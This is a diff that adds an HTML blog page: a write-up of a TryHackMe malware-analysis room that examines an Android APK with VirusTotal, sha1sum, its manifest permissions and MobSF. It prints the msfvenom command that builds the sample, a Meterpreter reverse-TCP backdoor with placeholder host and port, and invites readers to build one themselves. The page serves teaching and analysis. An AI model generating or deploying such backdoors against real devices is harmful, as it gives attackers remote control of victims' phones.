@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>SMA</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora">
+    <link rel="stylesheet" href="assets/fonts/ionicons.min.css">
+    <link rel="stylesheet" href="assets/css/Article-Clean.css">
+    <link rel="stylesheet" href="assets/css/Footer-Basic.css">
+    <link rel="stylesheet" href="assets/css/Highlight-Blue.css">
+    <link rel="stylesheet" href="assets/css/Navigation-Clean.css">
+    <link rel="stylesheet" href="assets/css/styles.css">
+</head>
+
+<body>
+    <nav class="navbar navbar-light navbar-expand-md navigation-clean" style="background: linear-gradient(rgb(30,106,221), rgb(30,106,221));">
+        <div class="container"><a class="navbar-brand" href="https://farinap5.github.io/" style="border-color: rgb(255,253,253);color: rgb(255,255,255);">Home</a></div>
+    </nav>
+    <div class="highlight-blue" style="background: linear-gradient(rgb(30,106,221) 53%, rgb(14,208,251));">
+        <div class="container">
+            <div class="intro">
+                <h2 class="text-center">Write up - Analyzing APK&nbsp;</h2>
+                <p class="text-center" style="text-align: center;">This write up is for a Try Hack Me room created by me. It is not necessary to run the application to analyse it. Simple Malware Analysis&nbsp; SMA</p>
+            </div>
+            <div class="buttons"></div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row" style="margin-right: -16px;">
+                <div class="col-md-12 d-md-flex justify-content-center align-items-center align-content-center align-self-center justify-content-md-center" style="margin-top: 40px;">
+                    <p style="text-align: center;color: rgb(128,131,135);margin-right: 40px;margin-left: 40px;">It is a simple write up that shows how I did create the room and the best tools to use over the course. It is very simple and intuitive.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12" style="margin-top: 14px;">
+                    <p style="text-align: justify;">First of all, the room gives us a file to download the material sample what will be analysed. After it has downloaded we can quickly see that the name is encrypted with Base64 and the format is .apk, showing us that we are leading
+                        with an application for Android.&nbsp;</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p style="text-align: justify;">The sample's size is 10,187 bytes, so it seems that it is not a complex application and has a few functions.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p style="text-align: justify;">We do not really know what we have in hands so let's upload it into VirusTotal to discover about how secure it is for it to be handled.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="article-clean">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-10 col-xl-8 offset-lg-1 offset-xl-2">
+                    <div class="intro"><img class="img-fluid" src="assets/img/Screenshot_2020-10-25_13-41-09.png"></div>
+                    <p style="text-align: center;">VirosTotal output.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p style="text-align: justify;">Half of the anti-viruses that scanned the sample are showing it as a Malware from Metasploit Framework, a generic one known as a Trojan, easily detected until now. Thirty engines detected this file, so it can give to the attacker the
+                        power of a reverse remote code execution.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p>This is right, and the command to create it was:</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p style="color: rgb(114,120,125);width: 693px;margin-top: 28px;text-align: justify;">msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;local ip&gt; LPORT=&lt;local port&gt; R &gt; package.apk</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p style="text-align: justify;margin-top: 16px;">You can try to generate a backdoor like this one and analyse the output by yourself.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p>Going deeper, take the SHA-1 signature using the command:</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p style="color: rgb(111,115,119);margin-top: 8px;">sha1sum package.apk</p>
+                    <p style="color: rgb(110,111,112);margin-top: -13px;">74d442594acf11dc6e3492ffea5eb8956afd000d&nbsp; package.apk</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p style="margin-top: 10px;text-align: justify;">By extracting the content, it will create a folder with some files inside, one of which is a XML called AndroidManifes.xml. It describes some important information about the application for Android build tools, for Android operating
+                        system and for Google Play. This file declares items, shows some stuff as the package name and the permissions required to the device.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p>In that XML file are required twenty two permissions as camera access&nbsp; (android.permission.CAMERA) among others that are too dangerous.&nbsp;</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <p class="text-justify">We could analyse this application without other programs, but MobSF is such a useful tool that brings us many important and deep information about every application. The tool also makes a good analysis about the signature.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="article-clean">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-10 col-xl-8 offset-lg-1 offset-xl-2">
+                    <div class="intro"><img class="img-fluid" src="assets/img/Screenshot_2020-10-25_14-56-11.png"></div>
+                    <p class="text-center">Mobile Security Framework - MobSF output.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12" style="width: 716px;height: 145px;">
+                    <p class="text-justify">The signature seems vulnerable by suffering an attack from "Janus" on any Android &lt; 7.0, so it allows the attacker to modify the code of the application without affecting their signature.&nbsp;</p>
+                    <p class="text-justify">The framework will also decompile the binary to the Java code in plane text.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer-basic" style="box-shadow: 0px 0px;background: linear-gradient(rgb(14,207,250), rgb(30,106,221));">
+        <footer>
+            <div class="social"><a href="https://github.com/farinap5/" style="color: rgb(255,255,255);"><i class="icon ion-social-github"></i></a></div>
+            <p style="font-size: 14px;color: rgb(255,255,255);text-align: center;">by farinap5&nbsp; &nbsp;25/10/2020</p>
+            <p class="copyright" style="color: rgb(224,224,224);">farinap5© 2020</p>
+        </footer>
+    </div>
+    <div></div>
+    <div class="article-clean"></div>
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+</body>
+
+</html>
